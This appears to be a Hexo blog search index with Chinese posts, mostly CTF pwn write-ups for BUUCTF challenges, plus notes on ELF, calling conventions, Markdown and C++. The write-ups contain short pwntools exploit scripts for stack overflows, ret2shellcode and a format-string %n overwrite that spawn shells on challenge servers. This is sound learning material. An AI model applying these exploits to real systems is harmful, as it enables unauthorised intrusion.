<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些pwn</title>
      <link href="/2023/12/05/some-small-pwn-topics/"/>
      <url>/2023/12/05/some-small-pwn-topics/</url>
      
        <content type="html"><![CDATA[<p>··········<span id="more"></span></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>checksec一下<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode0.png"><br>32位文件，未开启canary保护，未开启PIE</p><p>丢到ida<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode1.png"><br>定义了一个字符型数组s，gets输入到s，并将s的0x64位字节数据赋给buf2</p><p>在gdb中发现gets函数的栈帧长度为0x92字，esp存储的是一个指针，可以看到数据是从0xffffd01c开始填充<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode2.png"><br>通过python可以算出需要填充108 + 4 个垃圾字节，再加4个字节的数据——返回地址<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode3.png"></p><p>找到全局变量buf2的地址<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode4.png"></p><p>写脚本  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">sh.senline = (shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2))</span><br><span class="line">sh.interactive()             </span><br></pre></td></tr></tbody></table></figure><p>得到了本地程序的shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode5.png">  </p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2text0.png"><br>32位，未开启canary，开启了NX<br>丢到ida里面看一下<br><img src="/2023/12/05/some-small-pwn-topics/ret2text1.png"></p><p>可以看到vulnerable函数里有gets函数，读到的值传到buffer里，距离ebp16个字节写exp<br>看到getshell函数首地址为<br><img src="/2023/12/05/some-small-pwn-topics/ret2text2.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text3.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text4.png"></p><p>打通。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探ELF</title>
      <link href="/2023/12/01/first-exploration-ELF/"/>
      <url>/2023/12/01/first-exploration-ELF/</url>
      
        <content type="html"><![CDATA[<p>浅浅地了解下ELF文件，以后会从多个角度反复阐述。<span id="more"></span></p><p><img src="/2023/12/01/first-exploration-ELF/elf.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位传参 VS 64位传参</title>
      <link href="/2023/11/20/i386-VS-AMD64/"/>
      <url>/2023/11/20/i386-VS-AMD64/</url>
      
        <content type="html"><![CDATA[<p>对32位传参和64位传参的比较<span id="more"></span></p><blockquote><p>i386=Intel 80386。其实i386通常被用来作为对Intel（英特尔）32位微处理器的统称。<br>AMD64，又称“x86-64”或“x64”，是一种64位元的电脑处理器架构。它是建基于现有32位元的x86架构，由AMD公司所开发。</p></blockquote><p>2位使用栈帧（栈帧是指函数在被调用时，所拥有的一块独立的用于存放函数所使用的状态和变量的栈空间。 每个函数都对应有一个栈帧。 同一个函数多次进入，每次可能会分配到不同的栈帧。 整个栈的内容在同一个时刻可以看作是由许多栈帧依序“堆叠”组成的。）来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数，当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_pwn_wp</title>
      <link href="/2023/11/18/buuctf-pwn-wp/"/>
      <url>/2023/11/18/buuctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>记录一些pwn题wp<span id="more"></span></p><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>测试nc， ls 看到有flag， cat flag得到flag。<br><img src="/2023/11/18/buuctf-pwn-wp/test_your_nc.png">  </p><blockquote><p>nc是<a href="https://so.csdn.net/so/search?q=netcat&amp;spm=1001.2101.3001.7020">netcat</a>的简写</p><p>（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>（2）端口的扫描，nc可以作为client发起TCP或UDP连接<br>（3）机器之间传输文件<br>（4）机器之间网络测速</p></blockquote><p><code>nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</code></p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>拖到ida里面看一下，发现有一个危险函数get ，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。顺便也知道了15个字节的存储空间，那么在栈帧中系统就会给我们分配一个15个字节的存储空间<br><img src="/2023/11/18/buuctf-pwn-wp/rip.png"><br>fun函数里面发现了system函数，system是c语言下的一个可以执行shell命令的函数，目前可以简单理解为，执行了这个危险函数，我们就拿到了远端服务器的shell，也就是相当于在windows下以管理员身份开启cmd，那么我们就可以通过一系列后续指令控制远端服务器。<br><img src="/2023/11/18/buuctf-pwn-wp/rip1.png"><br>编写脚本<br><img src="/2023/11/18/buuctf-pwn-wp/rip2.png"><br>ls 看到flag的文件，cat flag<br><img src="/2023/11/18/buuctf-pwn-wp/rip3.png"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p><img src="/2023/11/18/buuctf-pwn-wp/warmup_csaw_2016%201.png"><br>64位文件，而且没有开启保护<br>拖进ida<br><img src="/2023/11/18/buuctf-pwn-wp/warm2.png"><br> <img src="/2023/11/18/buuctf-pwn-wp/warm4.png"><br>发现危险函数_gets，还看到了system函数<br>编写payload脚本<br><img src="/2023/11/18/buuctf-pwn-wp/warmup4.png"><br><img src="/2023/11/18/buuctf-pwn-wp/warm3.png"></p><hr><h1 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h1><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p><img src="/2023/11/18/buuctf-pwn-wp/2019.png"><br>发现开启了NX，无法用shellcode<br>丢到ida  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);<span class="comment">// 设置标准输出 _bss_start 的缓冲方式</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>); <span class="comment">// 设置标准输入 stdin 的缓冲方式</span></span><br><span class="line">  func(); <span class="comment">// 调用 func 函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再看func函数  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="comment">//首先声明了一个长度为 44 的字符数组 v1 和一个浮点数 v2</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's guess the number."</span>); <span class="comment">//输出提示信息 "Let's guess the number."</span></span><br><span class="line">  gets(v1); <span class="comment">//使用 gets 函数（危险函数）接收输入，存储在 v1 中</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"cat /flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Its value should be 11.28125"</span>);</span><br><span class="line">    <span class="comment">//最后，通过比较 v2 是否等于 11.28125，如果相等，则执行 "cat /flag"，否则输出 "Its value should be 11.28125"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>找到system函数的地址<br><img src="/2023/11/18/buuctf-pwn-wp/20191.png"><br>写payload  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment"># 创建一个与远程主机通信的连接</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">28403</span>) </span><br><span class="line"><span class="comment"># 构造 payload，其中包含 'a'*(0x30+8) 的填充和 0x4006BE 的地址</span></span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x30</span> + <span class="number">8</span>) + p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="comment"># 发送 payload 到远程主机</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 与远程主机进行交互，可以手动输入或者使用脚本进行进一步的操作</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/18/buuctf-pwn-wp/20192.png">  </p><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p><img src="/2023/11/18/buuctf-pwn-wp/pwn5.png"><br>32位文件，开启了栈溢出保护，开启了NX<br>丢到ida里  </p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF //定义一个长度为100的字符数组</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x63</span>u); <span class="comment">//等待用户在终端收入，存入buf中，最多读取0x63u（99）个字节</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,"</span>); <span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">atoi</span>(nptr) == dword_804C044 ) <span class="comment">// 只要满足这个条件就可以得到flag</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    <span class="built_in">sub_80493D0</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>计算偏移量位10<br><img src="/2023/11/18/buuctf-pwn-wp/pwn51.png"><br>写下脚本  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">29083</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"AAAA%16$n%17$n%18$n%19$n"</span> + p32(bss) + p32(bss+<span class="number">1</span>) + p32(bss+<span class="number">2</span>) + p32(bss+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>cat falg<br><img src="/2023/11/18/buuctf-pwn-wp/pwn53.png"></p><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><p>checksec,32位文件，<br><img src="/2023/11/18/buuctf-pwn-wp/shellcode_asm0.png">    </p><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>checksec查看下保护 64 位文件，开启了NX无法使用shellcode<br><img src="/2023/11/18/buuctf-pwn-wp/2019c.png"><br>丢到ida里查看<br>发现encrypt函数里有gets函数，大概是栈溢出<br><img src="/2023/11/18/buuctf-pwn-wp/2019c1.png">  </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD 学习记录</title>
      <link href="/2023/11/12/my-first-blog-about-MD/"/>
      <url>/2023/11/12/my-first-blog-about-MD/</url>
      
        <content type="html"><![CDATA[<p>为了督促我的学习写一篇记录我的学习进程<span id="more"></span></p><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p><code># 一级标题</code></p><p><code>## 二级标题</code></p><p><code>### 三级标题</code></p><p><code>#### 四级标题</code></p><p><code>##### 五级标题</code></p><p><code>###### 六级标题</code></p><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><p><em>这是斜体</em>   <code>*这是斜体*</code></p><p><strong>这是粗体</strong>  <code>**这是粗体**</code></p><p><em><strong>这是粗斜体</strong></em>  <code>***这是粗斜体***</code></p><p><del>这是删除线</del>  <code>~~这是删除线~~</code></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p>这是文本一<br>这是文本二</p><p>这是文本一</p><p>这是文本二</p><p><code>这是文本一  这是文本二 //段落内换行使用换行符 &lt;br&gt;，或者 两个空格 + shift-Enter。</code></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ol><li><p>第一</p></li><li><p>第二</p></li><li><p>第三</p></li><li><p>第一</p></li><li><p>第二</p></li><li><p>第二</p></li><li><p>第二</p></li><li><p>第六</p></li><li><p><input checked="" disabled="" type="checkbox"> 已选中的选项</p></li><li><p><input disabled="" type="checkbox"> 未选中的选项</p></li></ol><ul><li>第一</li><li>第二</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 第一</span><br><span class="line"></span><br><span class="line">2. 第二</span><br><span class="line"></span><br><span class="line">3. 第三</span><br><span class="line"></span><br><span class="line">4. 第一</span><br><span class="line">5. 第二</span><br><span class="line">6. 第二</span><br><span class="line">7. 第二</span><br><span class="line">8. 第六</span><br><span class="line"></span><br><span class="line">9. [x] 已选中的选项</span><br><span class="line">10. [ ] 未选中的选项</span><br><span class="line"></span><br><span class="line">- 第一</span><br><span class="line">- 第二</span><br></pre></td></tr></tbody></table></figure><blockquote><p>当按两次空格发现没有退出列表，可以按ctrl + [ 取消缩进返回上一级。</p></blockquote><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote><p>引用</p></blockquote><p><code>&gt; 这是引用</code></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这是行内<code>代码</code></p><p><code>这是行内代码</code></p><h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">"hello world"</span> &lt;&lt; endl;</span><br></pre></td></tr></tbody></table></figure><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><hr><hr><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><ol><li>链接到网站<br><a href="https://ygkldnherr.github.io/">我的小站</a> <code>[我的小站](https://ygkldnherr.github.io)</code></li><li>连接到其他Markdown页面<br><a href="./hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world)</code></li><li>无标签链接<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>&lt;https://ygkldnherr.github.io&gt;</code></li><li>无标签邮箱链接<br><a href="mailto:ygkldnherr@gmail.com">ygkldnherr@gmail.com</a> <code>&lt;ygkldnherr@gmail.com&gt;</code></li><li>添加title<br><a href="./hello-world" title="点击跳转到hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world "点击跳转到hello-world")</code></li><li>自动超链接<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>https://ygkldnherr.github.io</code></li></ol><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ol><li>添加一个图片<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片"></li><li>带链接的图片<br><a href="https://ygkldnherr.github.io/"><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片"></a></li><li>带title的图片<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片" title="这是一个截图"></li></ol><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><p>两种方法：一种方法是直接输入，另一种方法是利用表情短码（利用两个冒号隔开）<br><span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>:joy:</code></p><h3 id="内嵌HTML"><a href="#内嵌HTML" class="headerlink" title="内嵌HTML"></a>内嵌HTML</h3><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table><thead><tr><th align="center">第一列</th><th align="center">第二列</th><th align="center">第三列</th></tr></thead><tbody><tr><td align="center">第一列第一列</td><td align="center">第二列第二列</td><td align="center">第三列第三列</td></tr></tbody></table><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|第一列|第二列|第三列|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|这是左对齐|这是居中对齐|这是右对齐|</span><br></pre></td></tr></tbody></table></figure><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><p>引用语法为<code>[^名称]</code><br>定义语法为<code>[^名称]: 内容</code></p><blockquote><p>脚注也可以作为常量来使用，如当图片名太长时可以用脚注来代替。</p></blockquote><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p>这是一个公式$ c^2 = a^2 + b^2 $<br>$$<br>c^2 = a^2 + b^2<br>$$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Some_c++_knowledge_points</title>
      <link href="/2023/11/09/Some-c-knowledge-points/"/>
      <url>/2023/11/09/Some-c-knowledge-points/</url>
      
        <content type="html"><![CDATA[<p>在做题的时候会接触到一些零碎的知识点（作为一个小白），记录防忘。<span id="more"></span></p><ol><li><p>有时会根据某些规律定量输出一定数量的空格</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%*s"</span>, i, <span class="string">" "</span>);<span class="comment">//*是占位，指的是i代表的域宽。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Initialized string: %.*s\n"</span>, <span class="built_in">sizeof</span>(str), str);</span><br></pre></td></tr></tbody></table></figure></li><li><p>基于范围的for循环</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e : arr)</span><br><span class="line">{</span><br><span class="line">cout &lt;&lt; e &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>反三角函数</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/05/hello-world/"/>
      <url>/2023/11/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<span id="more"></span></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
